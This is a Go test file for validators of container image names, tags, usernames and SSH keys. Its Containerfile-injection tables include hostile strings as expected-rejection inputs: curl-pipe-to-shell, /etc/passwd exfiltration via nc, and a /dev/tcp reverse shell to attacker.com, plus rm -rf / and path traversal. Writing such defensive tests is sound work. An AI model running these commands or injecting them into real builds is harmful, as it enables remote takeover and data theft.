package service

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestValidateImageName(t *testing.T) {
	tests := []struct {
		name      string
		imageName string
		wantErr   bool
	}{
		// Valid cases
		{
			name:      "simple lowercase name",
			imageName: "myimage",
			wantErr:   false,
		},
		{
			name:      "name with numbers",
			imageName: "image123",
			wantErr:   false,
		},
		{
			name:      "name with single dot",
			imageName: "my.image",
			wantErr:   false,
		},
		{
			name:      "name with underscore",
			imageName: "my_image",
			wantErr:   false,
		},
		{
			name:      "name with double underscore",
			imageName: "my__image",
			wantErr:   false,
		},
		{
			name:      "name with hyphen",
			imageName: "my-image",
			wantErr:   false,
		},
		{
			name:      "name with multiple hyphens",
			imageName: "my---image",
			wantErr:   false,
		},
		{
			name:      "name with mixed separators",
			imageName: "my.image_name",
			wantErr:   false,
		},
		{
			name:      "multi-component path",
			imageName: "namespace/image",
			wantErr:   false,
		},
		{
			name:      "deep multi-component path",
			imageName: "namespace/subnamespace/image",
			wantErr:   false,
		},
		{
			name:      "name with all valid characters",
			imageName: "my.image_name-123",
			wantErr:   false,
		},
		{
			name:      "maximum length",
			imageName: strings.Repeat("a", 255),
			wantErr:   false,
		},
		{
			name:      "single character",
			imageName: "a",
			wantErr:   false,
		},
		{
			name:      "name with multiple dots",
			imageName: "my.image.name",
			wantErr:   false,
		},
		{
			name:      "name starting with number",
			imageName: "123image",
			wantErr:   false,
		},
		{
			name:      "path with numbers",
			imageName: "ns123/image456",
			wantErr:   false,
		},

		// Invalid cases
		{
			name:      "empty string",
			imageName: "",
			wantErr:   true,
		},
		{
			name:      "starts with dot",
			imageName: ".myimage",
			wantErr:   true,
		},
		{
			name:      "starts with underscore",
			imageName: "_myimage",
			wantErr:   true,
		},
		{
			name:      "starts with hyphen",
			imageName: "-myimage",
			wantErr:   true,
		},
		{
			name:      "ends with dot",
			imageName: "myimage.",
			wantErr:   true,
		},
		{
			name:      "ends with underscore",
			imageName: "myimage_",
			wantErr:   true,
		},
		{
			name:      "ends with hyphen",
			imageName: "myimage-",
			wantErr:   true,
		},
		{
			name:      "contains uppercase letters",
			imageName: "MyImage",
			wantErr:   true,
		},
		{
			name:      "contains uppercase in path",
			imageName: "Namespace/image",
			wantErr:   true,
		},
		{
			name:      "contains spaces",
			imageName: "my image",
			wantErr:   true,
		},
		{
			name:      "contains special characters",
			imageName: "my@image",
			wantErr:   true,
		},
		{
			name:      "contains colon",
			imageName: "my:image",
			wantErr:   true,
		},
		{
			name:      "contains hash",
			imageName: "my#image",
			wantErr:   true,
		},
		{
			name:      "exceeds maximum length",
			imageName: strings.Repeat("a", 256),
			wantErr:   true,
		},
		{
			name:      "double slash in path",
			imageName: "namespace//image",
			wantErr:   true,
		},
		{
			name:      "starts with slash",
			imageName: "/image",
			wantErr:   true,
		},
		{
			name:      "ends with slash",
			imageName: "image/",
			wantErr:   true,
		},
		{
			name:      "component starts with separator",
			imageName: "namespace/.image",
			wantErr:   true,
		},
		{
			name:      "component ends with separator",
			imageName: "namespace/image.",
			wantErr:   true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			errs := ValidateImageName(&tt.imageName, "test.path")
			if tt.wantErr {
				require.NotEmpty(t, errs, "expected validation errors for %q", tt.imageName)
			} else {
				assert.Empty(t, errs, "expected no validation errors for %q, got: %v", tt.imageName, errs)
			}
		})
	}
}

func TestValidateImageName_NilPointer(t *testing.T) {
	errs := ValidateImageName(nil, "test.path")
	require.NotEmpty(t, errs, "expected validation error for nil pointer")
}

func TestValidateImageTag(t *testing.T) {
	tests := []struct {
		name     string
		imageTag string
		wantErr  bool
	}{
		// Valid cases
		{
			name:     "simple lowercase tag",
			imageTag: "latest",
			wantErr:  false,
		},
		{
			name:     "tag with numbers",
			imageTag: "v1",
			wantErr:  false,
		},
		{
			name:     "tag with version",
			imageTag: "v1.0.0",
			wantErr:  false,
		},
		{
			name:     "tag with underscore",
			imageTag: "my_tag",
			wantErr:  false,
		},
		{
			name:     "tag with hyphen",
			imageTag: "my-tag",
			wantErr:  false,
		},
		{
			name:     "tag with dot",
			imageTag: "my.tag",
			wantErr:  false,
		},
		{
			name:     "tag with mixed separators",
			imageTag: "v1.0.0-beta.1",
			wantErr:  false,
		},
		{
			name:     "tag starting with number",
			imageTag: "123tag",
			wantErr:  false,
		},
		{
			name:     "tag starting with underscore",
			imageTag: "_tag",
			wantErr:  false,
		},
		{
			name:     "tag with uppercase letters",
			imageTag: "Latest",
			wantErr:  false,
		},
		{
			name:     "tag with all uppercase",
			imageTag: "LATEST",
			wantErr:  false,
		},
		{
			name:     "tag with mixed case",
			imageTag: "v1.0.0-Beta",
			wantErr:  false,
		},
		{
			name:     "maximum length",
			imageTag: strings.Repeat("a", 128),
			wantErr:  false,
		},
		{
			name:     "single character",
			imageTag: "a",
			wantErr:  false,
		},
		{
			name:     "tag with multiple dots",
			imageTag: "1.2.3.4.5",
			wantErr:  false,
		},
		{
			name:     "tag with multiple hyphens",
			imageTag: "my---tag",
			wantErr:  false,
		},
		{
			name:     "complex version tag",
			imageTag: "v1.2.3-alpha.1",
			wantErr:  false,
		},
		{
			name:     "tag with word characters only",
			imageTag: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_",
			wantErr:  false,
		},

		// Invalid cases
		{
			name:     "empty string",
			imageTag: "",
			wantErr:  true,
		},
		{
			name:     "starts with dot",
			imageTag: ".tag",
			wantErr:  true,
		},
		{
			name:     "starts with hyphen",
			imageTag: "-tag",
			wantErr:  true,
		},
		{
			name:     "exceeds maximum length",
			imageTag: strings.Repeat("a", 129),
			wantErr:  true,
		},
		{
			name:     "contains spaces",
			imageTag: "my tag",
			wantErr:  true,
		},
		{
			name:     "contains special characters",
			imageTag: "my@tag",
			wantErr:  true,
		},
		{
			name:     "contains colon",
			imageTag: "my:tag",
			wantErr:  true,
		},
		{
			name:     "contains hash",
			imageTag: "my#tag",
			wantErr:  true,
		},
		{
			name:     "contains slash",
			imageTag: "my/tag",
			wantErr:  true,
		},
		{
			name:     "contains backslash",
			imageTag: "my\\tag",
			wantErr:  true,
		},
		{
			name:     "contains exclamation",
			imageTag: "my!tag",
			wantErr:  true,
		},
		{
			name:     "contains at sign",
			imageTag: "my@tag",
			wantErr:  true,
		},
		{
			name:     "contains percent",
			imageTag: "my%tag",
			wantErr:  true,
		},
		{
			name:     "contains ampersand",
			imageTag: "my&tag",
			wantErr:  true,
		},
		{
			name:     "contains asterisk",
			imageTag: "my*tag",
			wantErr:  true,
		},
		{
			name:     "contains parentheses",
			imageTag: "my(tag)",
			wantErr:  true,
		},
		{
			name:     "contains brackets",
			imageTag: "my[tag]",
			wantErr:  true,
		},
		{
			name:     "contains braces",
			imageTag: "my{tag}",
			wantErr:  true,
		},
		{
			name:     "contains equals",
			imageTag: "my=tag",
			wantErr:  true,
		},
		{
			name:     "contains plus",
			imageTag: "my+tag",
			wantErr:  true,
		},
		{
			name:     "contains question mark",
			imageTag: "my?tag",
			wantErr:  true,
		},
		{
			name:     "contains pipe",
			imageTag: "my|tag",
			wantErr:  true,
		},
		{
			name:     "contains tilde",
			imageTag: "my~tag",
			wantErr:  true,
		},
		{
			name:     "contains caret",
			imageTag: "my^tag",
			wantErr:  true,
		},
		{
			name:     "contains dollar",
			imageTag: "my$tag",
			wantErr:  true,
		},
		{
			name:     "unicode characters",
			imageTag: "my-täg",
			wantErr:  true,
		},
		{
			name:     "emoji",
			imageTag: "my-🚀-tag",
			wantErr:  true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			errs := ValidateImageTag(&tt.imageTag, "test.path")
			if tt.wantErr {
				require.NotEmpty(t, errs, "expected validation errors for %q", tt.imageTag)
			} else {
				assert.Empty(t, errs, "expected no validation errors for %q, got: %v", tt.imageTag, errs)
			}
		})
	}
}

func TestValidateImageTag_NilPointer(t *testing.T) {
	errs := ValidateImageTag(nil, "test.path")
	require.NotEmpty(t, errs, "expected validation error for nil pointer")
}

func TestValidateImageTag_EdgeCases(t *testing.T) {
	tests := []struct {
		name     string
		imageTag string
		wantErr  bool
	}{
		{
			name:     "exactly 128 characters",
			imageTag: strings.Repeat("a", 128),
			wantErr:  false,
		},
		{
			name:     "129 characters",
			imageTag: strings.Repeat("a", 129),
			wantErr:  true,
		},
		{
			name:     "tag with all allowed characters",
			imageTag: "aA1._-",
			wantErr:  false,
		},
		{
			name:     "tag with consecutive dots",
			imageTag: "v1..0",
			wantErr:  false, // consecutive dots are allowed in tags
		},
		{
			name:     "tag with consecutive hyphens",
			imageTag: "v1---0",
			wantErr:  false, // consecutive hyphens are allowed in tags
		},
		{
			name:     "tag ending with dot",
			imageTag: "tag.",
			wantErr:  false, // tags can end with dot
		},
		{
			name:     "tag ending with hyphen",
			imageTag: "tag-",
			wantErr:  false, // tags can end with hyphen
		},
		{
			name:     "tag ending with underscore",
			imageTag: "tag_",
			wantErr:  false, // tags can end with underscore
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			errs := ValidateImageTag(&tt.imageTag, "test.path")
			if tt.wantErr {
				require.NotEmpty(t, errs, "expected validation errors for %q", tt.imageTag)
			} else {
				assert.Empty(t, errs, "expected no validation errors for %q, got: %v", tt.imageTag, errs)
			}
		})
	}
}

// TestValidateImageTag_ContainerfileInjectionAttacks tests that tags cannot be used to inject
// malicious code into the Containerfile template. The template uses:
//
//	FROM {{.RegistryHostname}}/{{.ImageName}}:{{.ImageTag}}
//
// This test ensures that tags that could break out of the FROM instruction or inject
// shell commands are properly rejected.
func TestValidateImageTag_ContainerfileInjectionAttacks(t *testing.T) {
	tests := []struct {
		name     string
		imageTag string
		desc     string
		wantErr  bool
	}{
		// Command injection attempts
		{
			name:     "newline injection to break FROM line",
			imageTag: "latest\nRUN echo malicious",
			desc:     "newline could break out of FROM instruction and inject RUN command",
			wantErr:  true,
		},
		{
			name:     "carriage return injection",
			imageTag: "latest\rRUN echo malicious",
			desc:     "carriage return could break out of FROM instruction",
			wantErr:  true,
		},
		{
			name:     "semicolon command injection",
			imageTag: "latest; RUN echo malicious",
			desc:     "semicolon could allow command chaining in shell context",
			wantErr:  true,
		},
		{
			name:     "ampersand command injection",
			imageTag: "latest && echo malicious",
			desc:     "ampersand could allow command chaining",
			wantErr:  true,
		},
		{
			name:     "pipe command injection",
			imageTag: "latest | echo malicious",
			desc:     "pipe could allow command chaining",
			wantErr:  true,
		},
		{
			name:     "backtick command substitution",
			imageTag: "latest`echo malicious`",
			desc:     "backticks could allow command substitution in shell",
			wantErr:  true,
		},
		{
			name:     "dollar command substitution",
			imageTag: "latest$(echo malicious)",
			desc:     "dollar parentheses could allow command substitution",
			wantErr:  true,
		},
		{
			name:     "dollar brace command substitution",
			imageTag: "latest${echo malicious}",
			desc:     "dollar braces could allow variable/command expansion",
			wantErr:  true,
		},
		{
			name:     "redirect output injection",
			imageTag: "latest > /tmp/malicious",
			desc:     "redirect could be used to write files",
			wantErr:  true,
		},
		{
			name:     "redirect append injection",
			imageTag: "latest >> /tmp/malicious",
			desc:     "redirect append could be used to write files",
			wantErr:  true,
		},
		{
			name:     "redirect input injection",
			imageTag: "latest < /tmp/malicious",
			desc:     "redirect input could be used to read files",
			wantErr:  true,
		},
		{
			name:     "OR command injection",
			imageTag: "latest || echo malicious",
			desc:     "OR operator could allow command chaining",
			wantErr:  true,
		},
		{
			name:     "background process injection",
			imageTag: "latest & echo malicious",
			desc:     "background process could allow command execution",
			wantErr:  true,
		},
		// Breaking out of FROM instruction
		{
			name:     "newline before FROM ends",
			imageTag: "latest\n# Comment",
			desc:     "newline could break FROM and add comment",
			wantErr:  true,
		},
		{
			name:     "newline with RUN command",
			imageTag: "latest\nRUN rm -rf /",
			desc:     "newline could inject destructive RUN command",
			wantErr:  true,
		},
		{
			name:     "newline with COPY command",
			imageTag: "latest\nCOPY malicious /",
			desc:     "newline could inject COPY command",
			wantErr:  true,
		},
		{
			name:     "newline with ADD command",
			imageTag: "latest\nADD malicious /",
			desc:     "newline could inject ADD command",
			wantErr:  true,
		},
		{
			name:     "newline with ENV command",
			imageTag: "latest\nENV MALICIOUS=value",
			desc:     "newline could inject ENV command",
			wantErr:  true,
		},
		// Variable expansion attacks
		{
			name:     "dollar variable expansion",
			imageTag: "latest$PATH",
			desc:     "dollar could expand environment variables",
			wantErr:  true,
		},
		{
			name:     "dollar with variable name",
			imageTag: "latest$HOME",
			desc:     "dollar could expand to user home directory",
			wantErr:  true,
		},
		// Template injection attempts (if template engine is vulnerable)
		{
			name:     "template variable injection",
			imageTag: "latest{{.Malicious}}",
			desc:     "template syntax could inject variables if template engine is vulnerable",
			wantErr:  true,
		},
		{
			name:     "template function injection",
			imageTag: "latest{{printf \"%s\" .Malicious}}",
			desc:     "template functions could execute code if template engine is vulnerable",
			wantErr:  true,
		},
		// Multi-line injection attempts
		{
			name:     "multiple newlines with commands",
			imageTag: "latest\n\nRUN echo malicious\n",
			desc:     "multiple newlines could inject multiple commands",
			wantErr:  true,
		},
		{
			name:     "newline with continuation",
			imageTag: "latest\\\nRUN echo malicious",
			desc:     "backslash newline could continue command on next line",
			wantErr:  true,
		},
		// Special characters that could break parsing
		{
			name:     "tab character injection",
			imageTag: "latest\tRUN echo malicious",
			desc:     "tab could be used to format malicious command",
			wantErr:  true,
		},
		{
			name:     "null byte injection",
			imageTag: "latest\x00RUN echo malicious",
			desc:     "null byte could break string parsing",
			wantErr:  true,
		},
		// Real-world attack examples
		{
			name:     "real-world example: command chaining",
			imageTag: "latest; curl attacker.com | sh",
			desc:     "real-world attack: download and execute script",
			wantErr:  true,
		},
		{
			name:     "real-world example: data exfiltration",
			imageTag: "latest; cat /etc/passwd | nc attacker.com 4444",
			desc:     "real-world attack: exfiltrate sensitive data",
			wantErr:  true,
		},
		{
			name:     "real-world example: reverse shell",
			imageTag: "latest; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
			desc:     "real-world attack: establish reverse shell",
			wantErr:  true,
		},
		// Edge cases with valid characters that could be combined
		{
			name:     "valid tag that looks suspicious",
			imageTag: "latest-version",
			desc:     "valid tag with hyphen should pass",
			wantErr:  false,
		},
		{
			name:     "valid tag with dots",
			imageTag: "v1.2.3",
			desc:     "valid version tag should pass",
			wantErr:  false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			errs := ValidateImageTag(&tt.imageTag, "spec.source.imageTag")
			if tt.wantErr {
				require.NotEmpty(t, errs, "expected validation errors for injection attack: %q\nDescription: %s", tt.imageTag, tt.desc)
				// Verify the error message mentions the validation
				errorMsg := errs[0].Error()
				assert.Contains(t, errorMsg, "spec.source.imageTag", "error should reference the field path")
			} else {
				assert.Empty(t, errs, "expected no validation errors for valid tag: %q\nDescription: %s\nGot errors: %v", tt.imageTag, tt.desc, errs)
			}
		})
	}
}

// TestValidateImageName_ContainerfileInjectionAttacks tests that image names cannot be used
// to inject malicious code into the Containerfile template.
func TestValidateImageName_ContainerfileInjectionAttacks(t *testing.T) {
	tests := []struct {
		name      string
		imageName string
		desc      string
		wantErr   bool
	}{
		// Command injection attempts
		{
			name:      "newline injection in image name",
			imageName: "myimage\nRUN echo malicious",
			desc:      "newline could break out of FROM instruction",
			wantErr:   true,
		},
		{
			name:      "semicolon injection in image name",
			imageName: "myimage; RUN echo malicious",
			desc:      "semicolon could allow command chaining",
			wantErr:   true,
		},
		{
			name:      "backtick injection in image name",
			imageName: "myimage`echo malicious`",
			desc:      "backticks could allow command substitution",
			wantErr:   true,
		},
		{
			name:      "dollar command substitution in image name",
			imageName: "myimage$(echo malicious)",
			desc:      "dollar parentheses could allow command substitution",
			wantErr:   true,
		},
		// Path traversal attempts
		{
			name:      "path traversal with dots",
			imageName: "../../etc/passwd",
			desc:      "path traversal could access sensitive files",
			wantErr:   true,
		},
		{
			name:      "absolute path injection",
			imageName: "/etc/passwd",
			desc:      "absolute path could reference system files",
			wantErr:   true,
		},
		// Breaking FROM instruction
		{
			name:      "newline breaks FROM",
			imageName: "myimage\n# Injected comment",
			desc:      "newline could break FROM and add comment",
			wantErr:   true,
		},
		{
			name:      "space injection before slash",
			imageName: "myimage /malicious",
			desc:      "space could break image reference parsing",
			wantErr:   true,
		},
		// Valid cases that should pass
		{
			name:      "valid image name with path",
			imageName: "namespace/image",
			desc:      "valid multi-component path should pass",
			wantErr:   false,
		},
		{
			name:      "valid image name with separators",
			imageName: "my.image_name",
			desc:      "valid name with dots and underscores should pass",
			wantErr:   false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			errs := ValidateImageName(&tt.imageName, "spec.source.imageName")
			if tt.wantErr {
				require.NotEmpty(t, errs, "expected validation errors for injection attack: %q\nDescription: %s", tt.imageName, tt.desc)
			} else {
				assert.Empty(t, errs, "expected no validation errors for valid name: %q\nDescription: %s\nGot errors: %v", tt.imageName, tt.desc, errs)
			}
		})
	}
}

func TestValidateUsername(t *testing.T) {
	tests := []struct {
		name     string
		username string
		wantErr  bool
	}{
		// Valid cases
		{
			name:     "simple username",
			username: "testuser",
			wantErr:  false,
		},
		{
			name:     "username with numbers",
			username: "user123",
			wantErr:  false,
		},
		{
			name:     "username with dots",
			username: "user.name",
			wantErr:  false,
		},
		{
			name:     "username with hyphens",
			username: "user-name",
			wantErr:  false,
		},
		{
			name:     "username with underscores",
			username: "user_name",
			wantErr:  false,
		},
		{
			name:     "username starting with underscore",
			username: "_user",
			wantErr:  false,
		},
		{
			name:     "username starting with dot",
			username: ".user",
			wantErr:  false,
		},
		{
			name:     "username starting with digit",
			username: "1user",
			wantErr:  false,
		},
		{
			name:     "single character username",
			username: "a",
			wantErr:  false,
		},
		{
			name:     "username with trailing dollar (Samba machine account)",
			username: "machine$",
			wantErr:  false,
		},
		// Invalid cases - '@' not allowed (rejected by useradd)
		{
			name:     "username with @ (rejected by useradd)",
			username: "user@example.com",
			wantErr:  true,
		},
		{
			name:     "username with @ in middle",
			username: "user@domain",
			wantErr:  true,
		},
		// Invalid cases - leading hyphen not allowed
		{
			name:     "username starting with hyphen",
			username: "-user",
			wantErr:  true,
		},
		// Invalid cases - dollar only allowed at end
		{
			name:     "username with dollar in middle",
			username: "user$name",
			wantErr:  true,
		},
		{
			name:     "username with dollar at start",
			username: "$user",
			wantErr:  true,
		},
		{
			name:     "empty username",
			username: "",
			wantErr:  true,
		},
		{
			name:     "username with semicolon",
			username: "user;malicious",
			wantErr:  true,
		},
		{
			name:     "username with pipe",
			username: "user|malicious",
			wantErr:  true,
		},
		{
			name:     "username with newline",
			username: "user\nmalicious",
			wantErr:  true,
		},
		{
			name:     "username with backtick",
			username: "user`malicious`",
			wantErr:  true,
		},
		{
			name:     "username with dollar and parentheses",
			username: "user$(malicious)",
			wantErr:  true,
		},
		{
			name:     "username with quotes",
			username: "user'malicious'",
			wantErr:  true,
		},
		{
			name:     "username with leading space",
			username: " user",
			wantErr:  true,
		},
		{
			name:     "username with trailing space",
			username: "user ",
			wantErr:  true,
		},
		{
			name:     "username with embedded space",
			username: "user name",
			wantErr:  true,
		},
		{
			name:     "username with multiple spaces",
			username: "user name here",
			wantErr:  true,
		},
		{
			name:     "username too long",
			username: strings.Repeat("a", 257),
			wantErr:  true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			errs := ValidateUsername(&tt.username, "spec.userConfiguration.username")
			if tt.wantErr {
				require.NotEmpty(t, errs, "expected validation errors for username: %q", tt.username)
			} else {
				assert.Empty(t, errs, "expected no validation errors for username: %q\nGot errors: %v", tt.username, errs)
			}
		})
	}
}

func TestValidatePublicKey(t *testing.T) {
	validSSHKey := "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vbqajDhA/2dZ0jofdR7H3nKJvN2k3J8K9L0M1N2O3P4Q5R6S7T8U9V0W1X2Y3Z4A5B6C7D8E9F0G1H2I3J4K5L6M7N8O9P0Q1R2S3T4U5V6W7X8Y9Z0A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8S9T0U1V2W3X4Y5Z6A7B8C9D0E1F2G3H4I5J6K7L8M9N0O1P2Q3R4S5T6U7V8W9X0Y1Z2A3B4C5D6E7E8F9G0H1I2J3K4L5M6N7O8P9Q0R1S2T3U4V5W6X7Y8Z9A0B1C2D3E4F5G6H7I8J9K0L1M2N3O4P5Q6R7S8T9U0V1W2X3Y4Z5A6B7C8D9E0F1G2H3I4J5K6L7M8N9O0P1Q2R3S4T5U6V7W8X9Y0Z1A2B3C4D5E6F7G8H9I0J1K2L3M4N5O6P7Q8R9S0T1U2V3W4X5Y6Z7A8B9C0D1E2F3G4H5I6J7K8L9M0N1O2P3Q4R5S6T7U8V9W0X1Y2Z3A4B5C6D7E8F9G0H1I2J3K4L5M6N7O8P9Q0R1S2T3U4V5W6X7Y8Z9A0B1C2D3E4F5G6H7I8J9K0L1M2N3O4P5Q6R7S8T9U9 test@example.com"

	tests := []struct {
		name      string
		publicKey string
		wantErr   bool
	}{
		// Valid cases
		{
			name:      "valid ssh-rsa key",
			publicKey: validSSHKey,
			wantErr:   false,
		},
		{
			name:      "valid ssh-rsa key with trailing newline",
			publicKey: validSSHKey + "\n",
			wantErr:   false,
		},
		{
			name:      "valid ssh-ed25519 key",
			publicKey: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGq8vY8vY8vY8vY8vY8vY8vY8vY8vY8vY8vY8vY8vY8 test@example.com",
			wantErr:   false,
		},
		// Invalid cases
		{
			name:      "empty public key",
			publicKey: "",
			wantErr:   true,
		},
		{
			name:      "invalid key format",
			publicKey: "invalid-key-format",
			wantErr:   true,
		},
		{
			name:      "key with semicolon",
			publicKey: validSSHKey + "; malicious",
			wantErr:   true,
		},
		{
			name:      "key with newline in middle",
			publicKey: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB\nmalicious",
			wantErr:   true,
		},
		{
			name:      "invalid key type",
			publicKey: "invalid-type AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vbqajDhA/2dZ0jofdR7H3nKJvN2k3J8K9L0M1N2O3P4Q5R6S7T8U9V0W1X2Y3Z4A5B6C7D8E9F0G1H2I3J4K5L6M7N8O9P0Q1R2S3T4U5V6W7X8Y9Z0A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8S9T0U1V2W3X4Y5Z6A7B8C9D0E1F2G3H4I5J6K7L8M9N0O1P2Q3R4S5T6U7V8W9X0Y1Z2A3B4C5D6E7E8F9G0H1I2J3K4L5M6N7O8P9Q0R1S2T3U4V5W6X7Y8Z9A0B1C2D3E4F5G6H7I8J9K0L1M2N3O4P5Q6R7S8T9U0V1W2X3Y4Z5A6B7C8D9E0F1G2H3I4J5K6L7M8N9O0P1Q2R3S4T5U6V7W8X9Y0Z1A2B3C4D5E6F7G8H9I0J1K2L3M4N5O6P7Q8R9S0T1U2V3W4X5Y6Z7A8B9C0D1E2F3G4H5I6J7K8L9M0N1O2P3Q4R5S6T7U8V9W0X1Y2Z3A4B5C6D7E8F9G0H1I2J3K4L5M6N7O8P9Q0R1S2T3U4V5W6X7Y8Z9A0B1C2D3E4F5G6H7I8J9K0L1M2N3O4P5Q6R7S8T9U9 test@example.com",
			wantErr:   true,
		},
		{
			name:      "key too short",
			publicKey: "ssh-rsa short",
			wantErr:   true,
		},
		{
			name:      "key with space in base64 data",
			publicKey: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB gQC7vbqajDhA/2dZ0jofdR7H3nKJvN2k3J8K9L0M1N2O3P4Q5R6S7T8U9V0W1X2Y3Z4A5B6C7D8E9F0G1H2I3J4K5L6M7N8O9P0 test@example.com",
			wantErr:   true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			errs := ValidatePublicKey(&tt.publicKey, "spec.userConfiguration.publickey")
			if tt.wantErr {
				require.NotEmpty(t, errs, "expected validation errors for public key: %q", tt.publicKey)
			} else {
				assert.Empty(t, errs, "expected no validation errors for public key\nGot errors: %v", errs)
			}
		})
	}
}
